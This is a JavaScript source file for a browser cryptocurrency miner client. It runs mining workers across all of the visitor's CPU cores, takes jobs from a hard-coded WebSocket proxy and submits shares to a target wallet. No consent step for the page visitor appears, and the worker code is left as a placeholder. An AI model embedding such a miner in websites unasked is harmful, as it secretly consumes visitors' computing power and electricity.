// index.js - Main Client Entry Point
import { ProxyConnection } from './modules/proxy.js';

class WebMinerClient {
    /**
     * @param {string} walletAddress - Target crypto wallet address
     * @param {Object} options - Configuration adjustments
     */
    constructor(walletAddress, options = {}) {
        this.wallet = walletAddress;
        this.threads = options.threads || navigator.hardwareConcurrency || 2;
        this.throttle = options.throttle !== undefined ? options.throttle : 0.2;
        this.proxyUrl = options.proxyUrl || 'wss://proxy.securemesh.net:8443';
        
        this.workers = [];
        this.connection = null;
        this.currentJob = null;
        this.stats = { hashesSolved: 0, hashRate: 0 };
        this.eventListeners = {};
    }

    // Public API Methods
    start() {
        console.log(`[Miner] Initiating system context... Target: ${this.wallet}`);
        this._connectToProxy();
        this._spawnWorkers();
        this._startMetricsReporting();
    }

    stop() {
        console.log('[Miner] Halting processing operations...');
        this.workers.forEach(worker => worker.terminate());
        this.workers = [];
        if (this.connection) this.connection.close();
        this.stats.hashRate = 0;
        this._emit('stop');
    }

    on(event, callback) {
        this.eventListeners[event] = callback;
    }

    // Internal Architecture Orchestration
    _connectToProxy() {
        this.connection = new ProxyConnection(this.proxyUrl);
        
        // Listen for new mining blocks/jobs forwarded from the stratum pool via websocket
        this.connection.onJob((jobData) => {
            this.currentJob = jobData;
            this._broadcastToWorkers({ type: 'NEW_JOB', job: this.currentJob });
        });
    }

    _spawnWorkers() {
        // Resolve path to the worker layout thread script
        const workerBlob = new Blob([/* Inlined worker.js string or separate network fetch */], { type: 'application/javascript' });
        const workerUrl = URL.createObjectURL(workerBlob);

        for (let i = 0; i < this.threads; i++) {
            const worker = new Worker(workerUrl);

            worker.onmessage = (event) => {
                this._handleWorkerMessage(event.data);
            };

            // Initialize worker state machine parameters
            worker.postMessage({
                type: 'INIT',
                throttle: this.throttle
            });

            this.workers.push(worker);
        }
    }

    _handleWorkerMessage(data) {
        switch (data.type) {
            case 'HASH_COUNT':
                this.stats.hashesSolved += data.count;
                this._emit('hash', data.count);
                break;
            case 'SHARE_FOUND':
                // Send verified structural shares immediately back to proxy server
                this.connection.sendShare({
                    job_id: this.currentJob.id,
                    nonce: data.nonce,
                    result: data.result
                });
                this._emit('share', data);
                break;
        }
    }

    _broadcastToWorkers(message) {
        this.workers.forEach(worker => worker.postMessage(message));
    }

    _emit(event, data) {
        if (this.eventListeners[event]) {
            this.eventListeners[event](data);
        }
    }

    _startMetricsReporting() {
        let lastCount = 0;
        setInterval(() => {
            const currentCount = this.stats.hashesSolved;
            this.stats.hashRate = currentCount - lastCount;
            lastCount = currentCount;
            this._emit('autometrics', { hashRate: this.stats.hashRate, total: currentCount });
        }, 1000);
    }
}

// Export for module systems or global window binding
if (typeof window !== 'undefined') window.WebMinerClient = WebMinerClient;
export default WebMinerClient;
